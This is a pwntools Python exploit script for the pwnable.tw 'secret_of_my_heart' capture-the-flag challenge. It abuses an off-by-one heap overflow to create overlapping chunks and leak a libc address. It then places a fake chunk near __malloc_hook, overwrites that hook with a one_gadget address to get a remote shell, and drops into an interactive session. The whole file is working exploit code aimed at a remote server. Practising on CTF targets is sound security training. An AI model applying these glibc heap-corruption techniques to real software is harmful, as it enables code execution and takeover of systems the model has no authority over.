from pwn import *
#off by one
p = remote('chall.pwnable.tw',10302)
libc = ELF('./libc_64.so.6')
#p = process('./secret_of_my_heart')
#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
#context.log_level = 'debug'
def add(size,name,secret):
        p.sendlineafter('Your choice :',str(1))
        p.sendlineafter('Size of heart : ',str(size))
        p.sendlineafter('Name of heart :',name)
        p.sendafter('secret of my heart :',secret)

def view(index):
        p.sendlineafter('Your choice :',str(2))
        p.sendlineafter('Index :',str(index))

def delete(index):
        p.sendlineafter('Your choice :',str(3))
        p.sendlineafter('Index :',str(index))


one_gadget = 0xef6c4
#one_gadget = 0xf03a4

#gdb.attach(p,"""break *0x5555555551ac""")
#gdb.attach(p,"""break *0x7ffff7a0d000+0xef6c4""")
#pause()
add(0xe8,'voht','A'*0xe8)        #index 0
#pause()
add(0x68,'voht','B'*0x68)        #index 1
add(0xf8,'voht','C'*0xf8)        #index 2
add(0x10,'voht','D'*0x10)        #index 3
delete(0)
delete(1)
add(0x68,'voht','B'*0x68)       # will be index 0
for i in range(0x66,0x5f,-1):
        delete(0)
        add(i+2,'voht','B'*i+'\x60\x01')
delete(2)
add(0xe8,'voht','A'*0xe0)       #will be index 1
view(0)
p.recvuntil('Secret : ')
tmp = u64(p.recv(6).ljust(8,'\x00'))
libc.address = tmp - libc.sym['__malloc_hook'] - 0x68
#log.info("libc base text: "+ hex(tmp-0x3c4b78))
log.info("libc base address: "+hex(libc.address))
for i in range(0xed,0xe7,-1):
        delete(1)
        add(i+1,'voht','E'*i+'\x70')
delete(1)
delete(0)
fake_chunk = libc.sym['__malloc_hook']-0x23
#pause()
log.info("fake_chunk adress: "+hex(fake_chunk))
add(0xf7,'voht','G'*0xf0+p64(fake_chunk))       #index 0
sleep(1)
for i in range(0xee,0xe7,-1):
        delete(0)
        add(i+1,'voht','H'*i+'\x70')
add(0x68,'voht','B'*60)         #index 1
add(0x68,'voht',0x13*'G'+p64(libc.address+one_gadget)) #index 2
delete(2)
#pause()
p.interactive()

